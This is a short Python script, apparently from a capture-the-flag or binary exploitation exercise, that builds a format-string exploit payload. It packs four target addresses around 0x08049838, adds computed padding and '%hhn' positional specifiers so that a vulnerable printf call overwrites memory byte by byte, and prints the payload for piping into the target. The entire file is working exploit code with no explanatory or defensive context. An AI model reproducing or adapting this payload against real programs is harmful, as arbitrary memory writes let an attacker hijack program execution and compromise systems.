padding_1 = "a" * 244
padding_2 = "a" * 4
padding_3 = "a" * 124
padding_4 = "a" * 32

# 0x08049838 x38... x98 x04 x08
adress_1 = "\x38\x98\x04\x08"
adress_2 = "\x39\x98\x04\x08"
adress_3 = "\x3a\x98\x04\x08"
adress_4 = "\x3b\x98\x04\x08"

payload =  adress_1 + adress_2 + adress_3 + adress_4 + padding_1 + "%6$hhn" + padding_2 + "%7$hhn" + padding_3 + "%5$hhn" + padding_4 + "%4$hhn"

import sys
sys.stdout.write(payload)